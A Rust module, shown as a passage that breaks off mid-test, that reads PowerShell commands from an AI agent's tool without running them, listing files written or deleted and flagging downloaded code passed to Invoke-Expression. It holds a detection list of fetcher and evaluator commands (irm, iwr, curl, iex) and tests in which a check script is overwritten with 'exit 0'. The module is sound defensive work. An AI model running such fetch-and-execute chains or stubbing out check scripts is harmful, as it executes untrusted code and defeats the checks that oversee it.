//! What a PowerShell command line visibly does to files, read without
//! running it.
//!
//! The counterpart of [`shell`](super::shell) for Claude Code's `PowerShell`
//! tool. It splits a command the way PowerShell splits words, quotes,
//! here-strings and operators, and recognises a few literal shapes: a
//! redirection into a file, a cmdlet that changes the paths it is given
//! (`Set-Content`, `Remove-Item`, `Move-Item`, ...) under its name or an
//! alias, a `[IO.File]` method given a literal path, a native program the
//! shell reader knows (`git checkout`, `sed -i`), and downloaded code handed
//! to `Invoke-Expression`. A write through a variable, a script or a
//! computed path is not seen; that is left to `proofs_from`.

use std::collections::HashSet;

use super::shell::{self, Reading};

#[derive(Debug, Clone, PartialEq, Eq)]
enum Token {
    /// A word, and whether any of it was quoted.
    Word(String, bool),
    /// `,`: the words on both sides are one array argument.
    Comma,
    /// `|`: the next command reads this one's output.
    Pipe,
    /// `;`, `&&`, `||` or a newline.
    Break,
    /// `(`, `{`, `$(`, `@(` or `@{`: a nested expression or script block.
    Open,
    /// `)` or `}`.
    Close,
    /// `>`, `>>`, `2>`, `*>`: the next word is written.
    WriteTo,
}

fn tokens(command: &str) -> Vec<Token> {
    let chars: Vec<char> = command.chars().collect();
    let mut out = Vec::new();
    let mut word = String::new();
    let mut quoted = false;
    let end_word = |word: &mut String, quoted: &mut bool, out: &mut Vec<Token>| {
        if !word.is_empty() || *quoted {
            out.push(Token::Word(std::mem::take(word), *quoted));
        }
        *quoted = false;
    };
    let mut at = 0;
    while at < chars.len() {
        let c = chars[at];
        let next = chars.get(at + 1).copied();
        match c {
            // A here-string runs from `@'` at the end of a line to `'@` at
            // the start of one; its body is data.
            '@' if matches!(next, Some('\'') | Some('"'))
                && chars[at + 2..]
                    .iter()
                    .take_while(|c| **c != '\n')
                    .all(|c| c.is_whitespace()) =>
            {
                let close = [next.unwrap_or('\''), '@'];
                quoted = true;
                at = chars[at..]
                    .iter()
                    .position(|c| *c == '\n')
                    .map_or(chars.len(), |offset| at + offset);
                let mut body = String::new();
                while at < chars.len() {
                    let start = at + 1;
                    let stop = chars
                        .get(start..)
                        .and_then(|rest| rest.iter().position(|c| *c == '\n'))
                        .map_or(chars.len(), |offset| start + offset);
                    let line: String = chars.get(start..stop).unwrap_or_default().iter().collect();
                    at = stop;
                    if line
                        .trim_end()
                        .starts_with(&close.iter().collect::<String>())
                    {
                        // Past the closing `'@`.
                        at = start + 1;
                        break;
                    }
                    if !body.is_empty() {
                        body.push('\n');
                    }
                    body.push_str(&line);
                }
                word.push_str(&body);
            }
            '\'' => {
                quoted = true;
                at += 1;
                while at < chars.len() {
                    if chars[at] == '\'' {
                        // `''` is one quote.
                        if chars.get(at + 1) == Some(&'\'') {
                            word.push('\'');
                            at += 2;
                            continue;
                        }
                        break;
                    }
                    word.push(chars[at]);
                    at += 1;
                }
            }
            '"' => {
                quoted = true;
                at += 1;
                while at < chars.len() {
                    match chars[at] {
                        '`' if at + 1 < chars.len() => {
                            at += 1;
                            word.push(chars[at]);
                        }
                        '"' if chars.get(at + 1) == Some(&'"') => {
                            word.push('"');
                            at += 1;
                        }
                        '"' => break,
                        other => word.push(other),
                    }
                    at += 1;
                }
            }
            // The escape character; at the end of a line, a continuation.
            '`' => {
                at += 1;
                if at < chars.len() && chars[at] != '\n' {
                    word.push(chars[at]);
                }
            }
            '#' if word.is_empty() && !quoted => {
                while at + 1 < chars.len() && chars[at + 1] != '\n' {
                    at += 1;
                }
            }
            '<' if next == Some('#') => {
                end_word(&mut word, &mut quoted, &mut out);
                at += 2;
                while at < chars.len() && !(chars[at] == '#' && chars.get(at + 1) == Some(&'>')) {
                    at += 1;
                }
                at += 1;
            }
            ' ' | '\t' | '\r' => end_word(&mut word, &mut quoted, &mut out),
            '\n' | ';' => {
                end_word(&mut word, &mut quoted, &mut out);
                out.push(Token::Break);
            }
            '|' => {
                end_word(&mut word, &mut quoted, &mut out);
                if next == Some('|') {
                    at += 1;
                    out.push(Token::Break);
                } else {
                    out.push(Token::Pipe);
                }
            }
            '&' => {
                end_word(&mut word, &mut quoted, &mut out);
                if next == Some('&') {
                    at += 1;
                    out.push(Token::Break);
                }
                // Alone, the call operator: the next word is the command.
            }
            ',' => {
                end_word(&mut word, &mut quoted, &mut out);
                out.push(Token::Comma);
            }
            '$' | '@' if next == Some('(') || (c == '@' && next == Some('{')) => {
                end_word(&mut word, &mut quoted, &mut out);
                at += 1;
                out.push(Token::Open);
            }
            '(' | '{' => {
                end_word(&mut word, &mut quoted, &mut out);
                out.push(Token::Open);
            }
            ')' | '}' => {
                end_word(&mut word, &mut quoted, &mut out);
                out.push(Token::Close);
            }
            '>' => {
                // `2>` and `*>` name a stream, not a word.
                if !quoted
                    && (word == "*"
                        || (!word.is_empty() && word.chars().all(|c| c.is_ascii_digit())))
                {
                    word.clear();
                } else {
                    end_word(&mut word, &mut quoted, &mut out);
                }
                if next == Some('>') {
                    at += 1;
                }
                if chars.get(at + 1) == Some(&'&') {
                    // `2>&1` merges a stream; nothing is written.
                    at += 1;
                    while chars.get(at + 1).is_some_and(|c| c.is_ascii_digit()) {
                        at += 1;
                    }
                } else {
                    out.push(Token::WriteTo);
                }
            }
            _ => word.push(c),
        }
        at += 1;
    }
    end_word(&mut word, &mut quoted, &mut out);
    out
}

/// What a cmdlet does to the paths it is given.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Kind {
    /// Writes, clears or removes its path.
    Changes,
    /// Creates its path, or `-Name` under it.
    Creates,
    /// Removes its path and writes its destination.
    Moves,
    /// Writes its destination.
    Copies,
    /// Removes its path and writes `-NewName` beside it.
    Renames,
    /// Writes its `-OutFile`.
    Downloads,
}

/// Cmdlets, under their names and their built-in aliases, lowercase.
const CMDLETS: &[(&[&str], Kind)] = &[
    (
        &[
            "set-content",
            "sc",
            "add-content",
            "ac",
            "clear-content",
            "clc",
            "clear-item",
            "cli",
            "set-item",
            "si",
            "out-file",
            "remove-item",
            "rm",
            "ri",
            "del",
            "erase",
            "rd",
            "rmdir",
            "tee-object",
            "tee",
            "export-csv",
            "epcsv",
            "export-clixml",
            "set-itemproperty",
            "sp",
            "clear-itemproperty",
            "clp",
            "remove-itemproperty",
            "rp",
            "new-itemproperty",
            "set-acl",
        ],
        Kind::Changes,
    ),
    (&["new-item", "ni", "mkdir", "md"], Kind::Creates),
    (&["move-item", "mv", "mi", "move"], Kind::Moves),
    (&["copy-item", "cp", "cpi", "copy"], Kind::Copies),
    (&["rename-item", "ren", "rni"], Kind::Renames),
    (
        &["invoke-webrequest", "iwr", "invoke-restmethod", "irm"],
        Kind::Downloads,
    ),
];

/// Parameters whose value is the path a cmdlet acts on.
const PATH_PARAMETERS: &[&str] = &["path", "literalpath", "filepath", "pspath", "lp"];
/// Other parameters that take a value, the common parameters among them.
const VALUE_PARAMETERS: &[&str] = &[
    "value",
    "encoding",
    "itemtype",
    "type",
    "name",
    "newname",
    "destination",
    "filter",
    "include",
    "exclude",
    "width",
    "delimiter",
    "inputobject",
    "credential",
    "stream",
    "target",
    "variable",
    "outfile",
    "uri",
    "method",
    "headers",
    "body",
    "erroraction",
    "ea",
    "warningaction",
    "wa",
    "informationaction",
    "infa",
    "progressaction",
    "proga",
    "errorvariable",
    "ev",
    "warningvariable",
    "wv",
    "informationvariable",
    "iv",
    "outvariable",
    "ov",
    "outbuffer",
    "ob",
    "pipelinevariable",
    "pv",
];
/// Parameters that take no value.
const SWITCHES: &[&str] = &[
    "force",
    "recurse",
    "nonewline",
    "append",
    "noclobber",
    "passthru",
    "confirm",
    "cf",
    "whatif",
    "wi",
    "verbose",
    "vb",
    "debug",
    "db",
    "usetransaction",
    "usetx",
    "asbytestream",
    "container",
    "notypeinformation",
];

/// A parameter as written, `-Dest` or `-Path:x`, by its full name: the
/// name or alias written in full, or else the one name it is a prefix of.
fn parameter(written: &str) -> Option<&'static str> {
    let written = written.to_ascii_lowercase();
    let names = || {
        PATH_PARAMETERS
            .iter()
            .chain(VALUE_PARAMETERS)
            .chain(SWITCHES)
    };
    if let Some(exact) = names().find(|name| **name == written) {
        return Some(exact);
    }
    let mut prefixed = names().filter(|name| name.starts_with(&written));
    match (prefixed.next(), prefixed.next()) {
        (Some(only), None) => Some(only),
        _ => None,
    }
}

/// Code that fetches from the network, and what runs a string as code.
const FETCHERS: &[&str] = &[
    "invoke-webrequest",
    "iwr",
    "invoke-restmethod",
    "irm",
    "curl",
    "wget",
];
const EVALUATORS: &[&str] = &["invoke-expression", "iex"];

/// How deep code handed over as a string is read again; past it, every
/// word is taken for a path it may write.
const DEPTH: usize = 8;

/// Cmdlets whose file is never piped in: what is piped is what they write.
const WRITES_INPUT: &[&str] = &[
    "out-file",
    "tee-object",
    "tee",
    "export-csv",
    "epcsv",
    "export-clixml",
];
/// Cmdlets a piped string is the content of, not the path to.
const CONTENT_INPUT: &[&str] = &["set-content", "sc", "add-content", "ac", "new-item", "ni"];

/// What a statement pipes into the next that may name paths.
#[derive(Default)]
struct Piped {
    paths: Vec<String>,
    /// Items from `Get-Item` or `Get-ChildItem`, which a cmdlet binds to
    /// its path by property name; a string binds only where the path is
    /// taken by value.
    items: bool,
}

/// One argument: a word, or words joined by commas into an array.
type Argument = Vec<(String, bool)>;

/// The command a statement runs, lowercase: past the call operator's
/// `.`, a module qualifier and `.exe`.
fn command_name(word: &str) -> String {
    let name = word
        .rsplit('\\')
        .next()
        .unwrap_or(word)
        .to_ascii_lowercase();
    name.strip_suffix(".exe")
        .map(str::to_string)
        .unwrap_or(name)
}

/// A cmdlet's arguments, bound to the parameters this reader knows.
struct Bound {
    named: Vec<(&'static str, Vec<String>)>,
    positional: Vec<Vec<String>>,
    /// A parameter this reader does not know was given: any positional
    /// argument may be its value or the path.
    unknown: bool,
}

impl Bound {
    fn new(arguments: &[Argument]) -> Self {
        let mut bound = Bound {
            named: Vec::new(),
            positional: Vec::new(),
            unknown: false,
        };
        let mut rest = arguments.iter();
        while let Some(argument) = rest.next() {
            let words: Vec<String> = argument.iter().map(|(word, _)| word.clone()).collect();
            let flag = match argument.as_slice() {
                [(word, false)] if word.len() > 1 && word.starts_with('-') => Some(&word[1..]),
                _ => None,
            };
            let Some(flag) = flag else {
                bound.positional.push(words);
                continue;
            };
            let (written, inline) = match flag.split_once(':') {
                Some((written, value)) => (written, Some(value.to_string())),
                None => (flag, None),
            };
            match parameter(written) {
                Some(name) if SWITCHES.contains(&name) => {}
                Some(name) => {
                    let values = match inline {
                        Some(value) => vec![value],
                        None => rest
                            .next()
                            .map(|value| value.iter().map(|(word, _)| word.clone()).collect())
                            .unwrap_or_default(),
                    };
                    bound.named.push((name, values));
                }
                None => bound.unknown = true,
            }
        }
        bound
    }

    /// The values given to `wanted` by name, else the positional argument
    /// at `position`.
    fn values(&self, wanted: &[&str], position: usize) -> Vec<String> {
        let found: Vec<String> = self
            .named
            .iter()
            .filter(|(name, _)| wanted.contains(name))
            .flat_map(|(_, values)| values.clone())
            .collect();
        if found.is_empty() {
            self.positional.get(position).cloned().unwrap_or_default()
        } else {
            found
        }
    }
}

/// What a cmdlet or a native program changes through its arguments; a
/// cmdlet given no path changes what is piped into it, `input`.
fn changed_at(arguments: &[Argument], input: &Piped, depth: usize) -> Reading {
    // `$x = Remove-Item y`: the command is past the assignment.
    let arguments = match arguments {
        [variable, operator, rest @ ..]
            if variable.len() == 1
                && variable[0].0.starts_with('$')
                && matches!(operator.as_slice(), [(op, false)] if op.ends_with('=')) =>
        {
            rest
        }
        _ => arguments,
    };
    let Some(first) = arguments.first().and_then(|argument| argument.first()) else {
        return Reading::default();
    };
    let name = command_name(&first.0);
    if EVALUATORS.contains(&name.as_str()) {
        // `iex "Remove-Item x"` runs its string, or the one piped into it.
        let code: Vec<&str> = arguments[1..]
            .iter()
            .flatten()
            .filter(|(word, quoted)| *quoted || !word.starts_with('-'))
            .map(|(word, _)| word.as_str())
            .collect();
        let code = if code.is_empty() {
            input.paths.join("\n")
        } else {
            code.join(" ")
        };
        return read_at(&code, depth + 1);
    }
    let Some(kind) = CMDLETS
        .iter()
        .find(|(names, _)| names.contains(&name.as_str()))
        .map(|(_, kind)| *kind)
    else {
        let words: Vec<String> = std::iter::once(name)
            .chain(
                arguments
                    .iter()
                    .flatten()
                    .skip(1)
                    .map(|(word, _)| word.clone()),
            )
            .collect();
        return native(&words, depth);
    };
    let bound = Bound::new(&arguments[1..]);
    let mut paths = bound.values(PATH_PARAMETERS, 0);
    let name = name.as_str();
    let binds = !WRITES_INPUT.contains(&name) && (input.items || !CONTENT_INPUT.contains(&name));
    if paths.is_empty() && kind != Kind::Downloads && binds {
        paths = input.paths.clone();
    }
    // A positional argument binds to the first position not bound by name:
    // with `-Path` named, the first one is the destination or new name.
    let second = if bound
        .named
        .iter()
        .any(|(name, _)| PATH_PARAMETERS.contains(name))
    {
        0
    } else {
        1
    };
    let mut changed = match kind {
        Kind::Changes => paths,
        Kind::Creates => {
            let names = bound.values(&["name"], usize::MAX);
            if names.is_empty() {
                paths
            } else {
                let bases = if paths.is_empty() {
                    vec![String::new()]
                } else {
                    paths
                };
                bases
                    .iter()
                    .flat_map(|base| names.iter().map(move |name| joined(base, name)))
                    .collect()
            }
        }
        Kind::Moves | Kind::Copies => {
            let mut changed = if kind == Kind::Moves {
                paths.clone()
            } else {
                Vec::new()
            };
            for destination in bound.values(&["destination"], second) {
                changed.extend(into(&destination, &paths));
            }
            changed
        }
        Kind::Renames => {
            let mut changed = paths.clone();
            for new_name in bound.values(&["newname"], second) {
                for source in &paths {
                    let dir = source.rsplit_once(['/', '\\']).map_or("", |(dir, _)| dir);
                    changed.push(joined(dir, &new_name));
                }
            }
            changed
        }
        Kind::Downloads => bound.values(&["outfile"], usize::MAX),
    };
    if bound.unknown {
        changed.extend(bound.positional.iter().flatten().cloned());
    }
    Reading {
        writes: changed,
        remote_code: None,
    }
}

/// What a native program changes: the string `cmd /c` or `powershell
/// -Command` runs, read again; any other as the shell reader reads it.
fn native(words: &[String], depth: usize) -> Reading {
    let Some((name, args)) = words.split_first() else {
        return Reading::default();
    };
    let name = command_name(name);
    match name.as_str() {
        "cmd" => {
            let code = args.iter().position(|arg| {
                ["/c", "/k", "/r"]
                    .iter()
                    .any(|flag| arg.eq_ignore_ascii_case(flag))
            });
            Reading {
                writes: code
                    .map(|at| cmd(&args[at + 1..].join(" "), depth + 1))
                    .unwrap_or_default(),
                remote_code: None,
            }
        }
        "powershell" | "pwsh" => code(args)
            .map(|code| read_at(&code, depth + 1))
            .unwrap_or_default(),
        _ => {
            let words: Vec<String> = std::iter::once(name).chain(args.iter().cloned()).collect();
            Reading {
                writes: shell::changed_by(&words),
                remote_code: None,
            }
        }
    }
}

/// The code `powershell` or `pwsh` runs: after `-Command`, or the
/// arguments after its options; `None` for a script or encoded code.
fn code(args: &[String]) -> Option<String> {
    const VALUES: &[&str] = &[
        "executionpolicy",
        "ep",
        "ex",
        "windowstyle",
        "w",
        "workingdirectory",
        "wd",
        "inputformat",
        "if",
        "inp",
        "outputformat",
        "of",
        "o",
        "configurationname",
        "config",
        "version",
        "v",
        "settingsfile",
        "settings",
        "custompipename",
    ];
    let mut at = 0;
    while let Some(flag) = args.get(at).and_then(|arg| arg.strip_prefix('-')) {
        let flag = flag.to_ascii_lowercase();
        at += 1;
        if flag == "c" || (flag.len() > 2 && "command".starts_with(&flag)) {
            break;
        }
        if VALUES.contains(&flag.as_str())
            || (flag.len() > 2 && VALUES.iter().any(|name| name.starts_with(&flag)))
        {
            at += 1;
        } else if flag == "f"
            || flag == "e"
            || ["fi", "ec", "en"]
                .iter()
                .any(|prefix| flag.starts_with(prefix))
        {
            return None;
        }
    }
    let code = args.get(at..)?.join(" ");
    (!code.is_empty()).then_some(code)
}

/// What `cmd /c` runs, read with cmd's rules: `&`, `&&`, `||`, `|` and
/// parentheses separate commands, `"` quotes, `^` escapes, and `>` writes
/// the word after it.
fn cmd(command: &str, depth: usize) -> Vec<String> {
    if depth > DEPTH {
        return command.split_whitespace().map(str::to_string).collect();
    }
    let chars: Vec<char> = command.chars().collect();
    let mut writes = Vec::new();
    let mut words: Vec<String> = Vec::new();
    let mut word = String::new();
    let mut quoted = false;
    // The word being read is a redirection's target, `Some(true)`, or a
    // file only read, `Some(false)`.
    let mut redirect: Option<bool> = None;
    let mut at = 0;
    loop {
        let c = chars.get(at).copied();
        // `2>` names a stream, not a word.
        if c == Some('>') && !quoted && matches!(word.as_str(), "1" | "2") {
            word.clear();
        }
        let ends = matches!(
            c,
            None | Some(' ' | '\t' | '&' | '|' | '(' | ')' | '\n' | '\r' | '<' | '>')
        );
        if ends && (!word.is_empty() || quoted) {
            let done = std::mem::take(&mut word);
            match redirect.take() {
                Some(true) if !done.eq_ignore_ascii_case("nul") => writes.push(done),
                Some(_) => {}
                None => words.push(done),
            }
            quoted = false;
        }
        match c {
            None => {
                writes.extend(builtin(&words, depth));
                break;
            }
            Some('"') => {
                quoted = true;
                at += 1;
                while at < chars.len() && chars[at] != '"' {
                    word.push(chars[at]);
                    at += 1;
                }
            }
            Some('^') => {
                at += 1;
                word.extend(chars.get(at));
            }
            Some('&' | '|' | '(' | ')' | '\n' | '\r') => {
                writes.extend(builtin(&words, depth));
                words.clear();
                if matches!(c, Some('&' | '|')) && chars.get(at + 1).copied() == c {
                    at += 1;
                }
            }
            Some('>') => {
                if chars.get(at + 1) == Some(&'>') {
                    at += 1;
                }
                if chars.get(at + 1) == Some(&'&') {
                    // `2>&1` merges a stream.
                    at += 2;
                } else {
                    redirect = Some(true);
                }
            }
            Some('<') => redirect = Some(false),
            Some(' ' | '\t') => {}
            Some(other) => word.push(other),
        }
        at += 1;
    }
    writes
}

/// What one command `cmd` runs changes: its built-ins `del`, `rd`, `copy`,
/// `move` and `ren` by cmd's rules, any other program as [`native`] reads
/// it.
fn builtin(words: &[String], depth: usize) -> Vec<String> {
    let Some((name, args)) = words.split_first() else {
        return Vec::new();
    };
    let operands: Vec<String> = args
        .iter()
        .filter(|arg| !arg.starts_with('/'))
        .cloned()
        .collect();
    let name = command_name(name.trim_start_matches('@'));
    match name.as_str() {
        "del" | "erase" | "rd" | "rmdir" => operands,
        "copy" | "move" => {
            let Some((destination, sources)) = operands.split_last() else {
                return Vec::new();
            };
            if sources.is_empty() {
                // `copy x` copies it here, or what it holds when it is a
                // directory.
                return vec![base(destination).to_string(), ".".to_string()];
            }
            let mut written = if name == "move" {
                sources.to_vec()
            } else {
                // A directory copied puts what it holds in the destination.
                vec![destination.clone()]
            };
            written.extend(into(destination, sources));
            written
        }
        // What the source holds lands in the destination, by default here.
        "xcopy" | "robocopy" => match operands.as_slice() {
            [_] => vec![".".to_string()],
            [_, destination, ..] => vec![destination.clone()],
            [] => Vec::new(),
        },
        "ren" | "rename" => match operands.as_slice() {
            [path, new_name, ..] => {
                let dir = path.rsplit_once(['/', '\\']).map_or("", |(dir, _)| dir);
                vec![path.clone(), joined(dir, new_name)]
            }
            _ => Vec::new(),
        },
        "mklink" => operands.first().cloned().into_iter().collect(),
        "echo" | "rem" | "type" | "dir" | "cd" | "chdir" | "pushd" | "popd" | "set" => Vec::new(),
        _ => native(words, depth).writes,
    }
}

/// What copying or moving `sources` to `destination` writes: the
/// destination when it may be the file written, and each source's name in
/// it when it may be a directory; a trailing separator, `.` or several
/// sources make it one.
fn into(destination: &str, sources: &[String]) -> Vec<String> {
    let directory = destination.ends_with(['/', '\\'])
        || matches!(destination, "." | "..")
        || sources.len() > 1;
    let mut written = if directory {
        Vec::new()
    } else {
        vec![destination.to_string()]
    };
    written.extend(
        sources
            .iter()
            .map(|source| joined(destination, base(source))),
    );
    written
}

/// The last name in `path`.
fn base(path: &str) -> &str {
    let path = path.trim_end_matches(['/', '\\']);
    path.rsplit(['/', '\\']).next().unwrap_or(path)
}

fn joined(base: &str, name: &str) -> String {
    let trimmed = base.trim_end_matches(['/', '\\']);
    match trimmed {
        "" if !base.is_empty() => format!("/{name}"),
        "" | "." => name.to_string(),
        _ => format!("{trimmed}/{name}"),
    }
}

/// What a `[System.IO]` method does with the arguments it is given.
enum Method {
    /// Writes, creates or deletes the arguments at these positions.
    Changes(&'static [usize]),
    /// Opens its first argument with the access its others name.
    Opens,
}

/// A `[System.IO]` type's static method or constructor, `None` for what
/// only reads: `ReadAllText`, `Exists`, `Get*`, `OpenRead`, a reader, or
/// `[IO.Path]`. Any other method of such a type is taken to change its
/// path.
fn dotnet(word: &str) -> Option<Method> {
    const READERS: &[&str] = &[
        "path",
        "streamreader",
        "binaryreader",
        "stringreader",
        "stringwriter",
        "memorystream",
        "fileinfo",
        "directoryinfo",
        "driveinfo",
        "filesystemwatcher",
    ];
    const READS: &[&str] = &[
        "read",
        "get",
        "exists",
        "enumerate",
        "openread",
        "opentext",
        "setcurrentdirectory",
        "equals",
        "referenceequals",
        "tostring",
    ];
    let lower = word.to_ascii_lowercase();
    let (class, method) = lower.strip_prefix('[')?.split_once("]::")?;
    let class = class.strip_prefix("system.").unwrap_or(class);
    let class = class.strip_prefix("io.")?;
    if READERS.contains(&class) || READS.iter().any(|read| method.starts_with(read)) {
        return None;
    }
    Some(match (class, method) {
        (_, "open") | ("filestream", "new") => Method::Opens,
        (_, "copy") => Method::Changes(&[1]),
        (_, "move" | "replace") => Method::Changes(&[0, 1, 2]),
        _ => Method::Changes(&[0]),
    })
}

/// Whether a file is opened only to read: an access of `Read`, and no
/// mode that creates, truncates or appends. Without an access, `Open`
/// gives read and write.
fn reads_only(words: &[String]) -> bool {
    let words: Vec<String> = words.iter().map(|word| word.to_ascii_lowercase()).collect();
    words
        .iter()
        .any(|word| word.rsplit("::").next() == Some("read"))
        && !words.iter().any(|word| {
            ["write", "create", "truncate", "append"]
                .iter()
                .any(|mode| word.contains(mode))
        })
}

/// A path as PowerShell names it, `/`-separated and past a `FileSystem::`
/// provider; `$PWD` and `$HOME` are left for the caller to expand. `None`
/// for what is not a file: `$null`, another variable, or another
/// provider's path such as `Env:X`.
fn file_path(path: &str) -> Option<String> {
    let path = match path.split_once("::") {
        Some((provider, rest)) => {
            let provider = provider.rsplit('\\').next().unwrap_or(provider);
            if !provider.eq_ignore_ascii_case("filesystem") {
                return None;
            }
            rest
        }
        None => path,
    };
    let (variable, rest) = ["$PWD", "$HOME"]
        .iter()
        .find_map(|variable| {
            let head = path.get(..variable.len())?;
            let rest = &path[variable.len()..];
            (head.eq_ignore_ascii_case(variable)
                && (rest.is_empty() || rest.starts_with(['/', '\\'])))
            .then_some((*variable, rest))
        })
        .unwrap_or(("", path));
    let provider = rest.split_once(':').is_some_and(|(drive, _)| {
        drive.len() > 1 && drive.chars().all(|c| c.is_ascii_alphabetic())
    });
    if path.is_empty() || rest.contains('$') || provider {
        return None;
    }
    Some(format!("{variable}{rest}").replace('\\', "/"))
}

/// What a statement pipes on that names paths: literal strings
/// (`'a', 'b' |`), what `Write-Output` is given, or the items `Get-Item`
/// and `Get-ChildItem` are given (`.` for none).
fn piped(arguments: &[Argument]) -> Piped {
    let Some((first, _)) = arguments.first().and_then(|argument| argument.first()) else {
        return Piped::default();
    };
    if arguments.iter().flatten().all(|(_, quoted)| *quoted) {
        return Piped {
            paths: arguments
                .iter()
                .flatten()
                .map(|(word, _)| word.clone())
                .collect(),
            items: false,
        };
    }
    let bound = Bound::new(&arguments[1..]);
    let (paths, items) = match command_name(first).as_str() {
        "write-output" | "echo" | "write" => (bound.positional.concat(), false),
        "get-item" | "gi" => (bound.values(PATH_PARAMETERS, 0), true),
        "get-childitem" | "gci" | "ls" | "dir" => {
            let paths = bound.values(PATH_PARAMETERS, 0);
            if paths.is_empty() {
                (vec![".".to_string()], true)
            } else {
                (paths, true)
            }
        }
        _ => (Vec::new(), false),
    };
    Piped { paths, items }
}

/// Ends a statement: names its command, adds what it changes, and returns
/// what it pipes on when `piping`.
fn end(
    arguments: &mut Vec<Argument>,
    input: &Piped,
    piping: bool,
    depth: usize,
    found: &mut Reading,
    names: &mut Vec<String>,
) -> Piped {
    if let Some((word, _)) = arguments.first().and_then(|argument| argument.first()) {
        names.push(command_name(word));
    }
    let changed = changed_at(arguments, input, depth);
    found.writes.extend(changed.writes);
    if found.remote_code.is_none() {
        found.remote_code = changed.remote_code;
    }
    let on = if piping {
        piped(arguments)
    } else {
        Piped::default()
    };
    arguments.clear();
    on
}

/// Read a PowerShell `command` for the writes and downloads it names.
pub fn read(command: &str) -> Reading {
    read_at(command, 0)
}

/// Read `command`, code handed over as a string `depth` times.
fn read_at(command: &str, depth: usize) -> Reading {
    let tokens = tokens(command);
    if depth > DEPTH {
        let writes = tokens
            .iter()
            .filter_map(|token| match token {
                Token::Word(word, _) => file_path(word),
                _ => None,
            })
            .collect();
        return Reading {
            writes,
            remote_code: None,
        };
    }
    // What the statements change, and downloaded code nested code names.
    let mut found = Reading::default();
    let mut names: Vec<String> = Vec::new();
    let mut arguments: Vec<Argument> = Vec::new();
    // What the statement before pipes into this one.
    let mut input = Piped::default();
    let mut joining = false;
    let mut at = 0;
    while at < tokens.len() {
        match &tokens[at] {
            Token::Word(word, quoted) => {
                if let (Some(method), Some(Token::Open)) = (dotnet(word), tokens.get(at + 1)) {
                    // The method's arguments, up to its closing parenthesis.
                    let mut nesting = 0;
                    let mut position = 0;
                    let mut taken: Vec<Option<String>> = Vec::new();
                    // The words after its first argument.
                    let mut rest: Vec<String> = Vec::new();
                    at += 1;
                    while at < tokens.len() {
                        match &tokens[at] {
                            Token::Open => nesting += 1,
                            Token::Close => {
                                nesting -= 1;
                                if nesting == 0 {
                                    break;
                                }
                            }
                            Token::Comma if nesting == 1 => position += 1,
                            Token::Word(argument, _) => {
                                // An argument's first word: a literal path,
                                // or the start of an expression.
                                if nesting == 1 && taken.len() <= position {
                                    taken.resize(position + 1, None);
                                    taken[position] = Some(argument.clone());
                                }
                                if position > 0 {
                                    rest.push(argument.clone());
                                }
                            }
                            _ => {}
                        }
                        at += 1;
                    }
                    let changes: &[usize] = match method {
                        Method::Changes(positions) => positions,
                        Method::Opens if reads_only(&rest) => &[],
                        Method::Opens => &[0],
                    };
                    found.writes.extend(
                        changes
                            .iter()
                            .filter_map(|position| taken.get(*position).cloned().flatten()),
                    );
                    at += 1;
                    continue;
                }
                let word = (word.clone(), *quoted);
                if joining && !arguments.is_empty() {
                    arguments.last_mut().expect("not empty").push(word);
                } else if !(arguments.is_empty() && !word.1 && word.0 == ".") {
                    // `.` dot-sources the command after it.
                    arguments.push(vec![word]);
                }
                joining = false;
            }
            Token::Comma => joining = true,
            Token::WriteTo => {
                if let Some(Token::Word(target, _)) = tokens.get(at + 1) {
                    found.writes.push(target.clone());
                    at += 1;
                }
            }
            token => {
                let piping = *token == Token::Pipe;
                input = end(
                    &mut arguments,
                    &input,
                    piping,
                    depth,
                    &mut found,
                    &mut names,
                );
                joining = false;
            }
        }
        at += 1;
    }
    end(&mut arguments, &input, false, depth, &mut found, &mut names);

    // Downloaded code handed to `Invoke-Expression`, in either order:
    // `irm x | iex`, `iex (irm x)`, `iex ((New-Object Net.WebClient)
    // .DownloadString(x))`, or a script block made from it.
    let fetcher = names.iter().find(|name| {
        FETCHERS.contains(&name.as_str())
            || name.contains("downloadstring")
            || name.contains("downloaddata")
    });
    let evaluator = names.iter().find(|name| {
        EVALUATORS.contains(&name.as_str()) || name.starts_with("[scriptblock]::create")
    });
    let remote_code = match (fetcher, evaluator) {
        (Some(fetcher), Some(evaluator)) => Some(format!(
            "{} | {}",
            fetcher.trim_start_matches('.'),
            evaluator
        )),
        _ => None,
    };
    let mut seen = HashSet::new();
    let writes = found
        .writes
        .iter()
        .filter_map(|path| file_path(path))
        .filter(|path| seen.insert(path.clone()))
        .collect();
    Reading {
        writes,
        remote_code: remote_code.or(found.remote_code),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn writes(command: &str) -> Vec<String> {
        read(command).writes
    }

    #[test]
    fn redirections_name_the_file_they_write() {
        assert_eq!(writes("'exit 0' > check.sh"), ["check.sh"]);
        assert_eq!(
            writes("cargo test 2>&1 >> .\\logs\\run.log"),
            ["./logs/run.log"]
        );
        assert_eq!(writes("cargo test *> $null"), Vec::<String>::new());
        assert_eq!(writes("node x.js 2> err.txt"), ["err.txt"]);
        // Quoted, a `>` is text.
        assert_eq!(
            writes("Write-Output 'a > b' \"c > d\""),
            Vec::<String>::new()
        );
    }

    #[test]
    fn cmdlets_and_their_aliases_name_the_paths_they_change() {
        assert_eq!(writes("Set-Content check.sh 'exit 0'"), ["check.sh"]);
        assert_eq!(
            writes("set-content -Value 'exit 0' -Path D:\\dev\\flot\\check.sh"),
            ["D:/dev/flot/check.sh"]
        );
        assert_eq!(writes("sc -Pat check.sh -Val x"), ["check.sh"]);
        assert_eq!(writes("Add-Content -LiteralPath:check.sh x"), ["check.sh"]);
        assert_eq!(
            writes("'x' | Out-File -FilePath out.txt -Encoding utf8"),
            ["out.txt"]
        );
        assert_eq!(
            writes("Remove-Item -Recurse -Force .flot, build"),
            [".flot", "build"]
        );
        assert_eq!(writes("del check.sh"), ["check.sh"]);
        assert_eq!(
            writes("del 'it''s.sh', \"say \"\"hi\"\".sh\""),
            ["it's.sh", "say \"hi\".sh"]
        );
        assert_eq!(
            writes("Move-Item check.sh old.sh"),
            ["check.sh", "old.sh", "old.sh/check.sh"]
        );
        // Into a directory, only what lands in it; one source to a name
        // that may be a file, both.
        assert_eq!(
            writes("Copy-Item -Path C:\\tmp\\fake.sh -Destination tests\\"),
            ["tests/fake.sh"]
        );
        assert_eq!(
            writes("Copy-Item a.sh, b.sh tests"),
            ["tests/a.sh", "tests/b.sh"]
        );
        assert_eq!(writes("Copy-Item x.sh tests"), ["tests", "tests/x.sh"]);
        assert_eq!(
            writes("Rename-Item -LiteralPath tests\\check.sh old.sh"),
